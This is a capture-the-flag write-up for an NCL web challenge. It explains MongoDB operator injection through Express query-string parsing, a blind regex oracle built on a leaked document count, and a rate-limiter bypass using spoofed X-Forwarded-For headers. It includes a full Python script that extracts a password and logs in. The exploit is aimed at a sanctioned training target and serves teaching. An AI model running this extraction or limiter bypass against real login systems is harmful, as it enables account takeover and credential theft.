# [Cyber Skyline / NCL 2026] - Tom's Login

> **Category:** Web (NoSQL Injection)
> **Points:** [TODO]
> **Solves:** [TODO]
> **Difficulty:** Medium
> **Author:** [Your handle]

## 📝 Challenge Description
> We have found a hacker's website posing as our beloved friend Tom's personal website. Can you identify the security vulnerability and log in as `tom`? We think it's possibly vulnerable but they've implemented a rate limiter on the website.
>
> *Note: Scope is limited to HTTPS. Educated & limited fuzzing is okay, but no automated/random bruteforce tools.*

### Provided Artifacts
* **Target:** `https://<id>-toms-login.web.cityinthe.cloud/login` — a single login page.
* `solve.py` — binary-search blind-extraction exploit (below).
* `extract_tom.sh` — the bash tool built during the solve (same logic, shell version).

---

## 🔍 Initial Discovery & Enumeration

### 1. Server Info
No binary here — this is a web target, so recon is HTTP headers and page behavior:

```bash
curl -sI 'https://<id>-toms-login.web.cityinthe.cloud/login'
```

* **Findings:**
  * `Server: nginx`, `X-Powered-By: Express` → Node.js / Express backend.
  * `X-RateLimit-Limit: 12` + `X-RateLimit-Remaining: …` → an application-level rate limiter, 12 requests per window.
  * Semantic-UI frontend assets; page title `Tom's Login`.
  * Backend behavior (below) is consistent with **MongoDB** — Express + Mongo is the classic pairing for this class of bug.

### 2. Behavior / Reconstructed Logic
The login takes `username` and `password` as query parameters. The response body renders a status and, crucially, a **document count**:

```html
<div class="content">Invalid Operation
  <div class="sub header">Database Documents : 1</div>
</div>
```

That `Database Documents : N` is the server telling us how many records the query matched. Because Express parses query strings with `qs`, a parameter written in bracket notation is turned into a **nested object**, not a string:

```
?username=tom&password[$regex]=^j
          │              │
          │              └── qs → { password: { $regex: "^j" } }
          └────────────────── { username: "tom" }
```

Reconstructed server logic (source was **not** provided — inferred from behavior):

```js
// NOT provided by the challenge — inferred
const count = await users.countDocuments({
  username: req.query.username,     // "tom"  (plain string)
  password: req.query.password,     // attacker-controlled: string OR operator object
});
res.send(render(`Database Documents : ${count}`));
```

Two behaviors pinned the attack surface:

* **Operator blacklist.** `username[$eq]=tom&password=password` returns *"Your login has one or more disallowed operations"* (1254 bytes). So `$eq`/`$ne`/etc. are filtered — a naive `{$ne: null}` auth bypass is blocked.
* **`$regex` is NOT filtered.** `password[$regex]=…` sails through and returns a document count. That count is a perfect **blind-boolean oracle**: since `username=tom` is unique, `N` is only ever `1` (match) or `0` (no match).

---

## 🚀 Exploitation / Solution Path

### Thought Process
1. **The Vulnerability:** MongoDB **operator injection** via Express/`qs` query-string parsing. The `password` field can be replaced with a `$regex` object, and the page leaks the match count — a boolean oracle.
2. **The Plan:** Operators never actually *log you in* (every operator query returns "Invalid Operation" + count). So this is a blind extraction, not an auth bypass:
   * Anchor a regex to a known prefix: `^<known><candidate>`. If it matches → `Documents : 1`, else `0`.
   * Walk the password one character at a time, then perform a **clean plaintext login** (no operators) with the recovered password.
3. **The Rate Limiter:** `X-RateLimit-Limit: 12` is keyed on the client IP as read from `X-Forwarded-For` — confirmed by watching `X-RateLimit-Remaining` change when the header changed. Rotating a random `X-Forwarded-For` per request gives each request a fresh bucket, neutralizing the limiter without any bruteforce tooling.

### Pivots (what failed first)
* **Bad success-detection v1.** First oracle logic was *"response differs from the known-fail response."* The page has per-request jitter, so body size wobbled and it false-positived — "recovered" a password of `5`. **Fix:** calibrate against a guaranteed-TRUE query (`.*`, which matches any password) as well as a guaranteed-FALSE one, and choose a stable discriminator.
* **Marker spacing.** Switched to a literal string match on `database documents: 1`. It never matched — the real text is `Database Documents : 1` (spaces *around* the colon). **Fix:** parse the integer with a whitespace-tolerant regex (`Documents\s*:\s*(\d+)`) instead of a brittle literal.
* **Linear scan was slow.** Trying all 62 alphanumerics per position is up to 62 requests/char. **Fix:** binary search (below).

### The optimization: binary search over character classes
A boolean oracle gives one bit per request, so the optimal per-character cost is `log₂(alphabet)`. Instead of testing letters one by one, split the charset and ask which half the next character is in, using a regex **class**:

```
^<prefix>[a-m]   →  Documents:1  ⇒ next char ∈ first half
                 →  Documents:0  ⇒ next char ∈ second half
```

That's **~6 requests/char** for a 62-char set instead of ~62 — roughly a **10× reduction**. Password length is found the same way up front with `^.{0,n}$`, so the solver knows exactly when to stop.

### Step-by-Step Execution
* **Step 1 — Confirm the oracle:** `password[$regex]=.*` → `Documents : 1`; `password[$regex]=^zzNOMATCH$` → `Documents : 0`.
* **Step 2 — Bypass the limiter:** send a random `X-Forwarded-For` on every request.
* **Step 3 — Find the length:** binary search on `^.{0,n}$`.
* **Step 4 — Extract each char:** binary search on `^<prefix>[<class>]` over `[A-Za-z0-9]`.
* **Step 5 — Verify:** `^<password>$` → `Documents : 1`.
* **Step 6 — Log in for real:** `username=tom&password=<recovered>` with **no operators** → the authenticated page / flag.

### Exploit Script (`solve.py`)
```python
#!/usr/bin/env python3
import re, time, random, string, requests
from urllib.parse import quote

BASE    = "https://<id>-toms-login.web.cityinthe.cloud"
LOGIN   = BASE + "/login"
USER    = "tom"
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits  # specials sanitized
DOC     = re.compile(r"Documents\s*:\s*(\d+)", re.I)

s = requests.Session()
reqs = 0

def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def oracle(regex: str) -> bool:
    """True iff {username:tom, password:{$regex:regex}} matches tom (Documents >= 1)."""
    global reqs
    # keep the key's brackets raw, URL-encode only the value — mirrors the working curl
    url = f"{LOGIN}?username={USER}&password[$regex]={quote(regex, safe='')}"
    while True:
        reqs += 1
        r = s.get(url, headers={"X-Forwarded-For": rand_ip()}, timeout=15)  # rotate IP bucket
        if r.status_code == 429:
            time.sleep(10); continue
        m = DOC.search(r.text)
        return bool(m and int(m.group(1)) >= 1)

def find_length(maxlen=64):
    if not oracle(f"^.{{0,{maxlen}}}$"):
        raise RuntimeError("password longer than maxlen")
    lo, hi = 0, maxlen
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"^.{{0,{mid}}}$"): hi = mid       # length <= mid
        else:                         lo = mid + 1
    return lo

def find_char(prefix):
    lo, hi = 0, len(CHARSET) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        cls = CHARSET[lo:mid + 1]
        if oracle(f"^{prefix}[{cls}]"): hi = mid     # char in lower half
        else:                           lo = mid + 1
    return CHARSET[lo]

def main():
    assert oracle(".*") and not oracle("^zzNOMATCH$"), "oracle sanity check failed"
    n = find_length()
    print(f"[*] length = {n}")
    pw = ""
    while len(pw) < n:
        pw += find_char(pw)
        print(f"[{len(pw):2}] {pw}")
    assert oracle(f"^{pw}$"), "exact-match verify failed"
    print(f"\n[+] password = {pw}   ({reqs} requests)")

    # clean plaintext login — no operators, so no 'Invalid Operation'
    url = f"{LOGIN}?username={USER}&password={quote(pw, safe='')}"
    r = s.get(url, headers={"X-Forwarded-For": rand_ip()})
    print(r.text)

if __name__ == "__main__":
    main()
```

---

## 🏁 Flag
Recovered password: `«RECOVERED_PASSWORD»`

```text
FLAG{«paste the flag from the plaintext-login response»}
```

## 🧠 Lessons Learned & Takeaways
* **What went well:** Spotted the operator-injection surface quickly from the bracket-notation parameter, and recognized the `Database Documents : N` count as a ready-made boolean oracle. The `X-Forwarded-For` rate-limit bypass fell out of simply reading the response headers.
* **What to improve:**
  * **Don't detect success by "it's different."** Page jitter produced a false positive (a password of `5`). Always calibrate against a *known-true* and *known-false* and lock onto a stable signal — here, the parsed document count.
  * **Match the real output, not the output you assumed.** The `Database Documents : 1` spacing cost a round-trip; a whitespace-tolerant regex would have been right the first time.
  * **Pick the optimal oracle strategy early.** A boolean oracle is `log₂(n)` per character — binary search should have been the default, not the fallback after a slow linear pass.
* **Tools Used:** `curl`, Python (`requests`), a custom bash extractor (`extract_tom.sh`), and plain browser requests for recon.
```
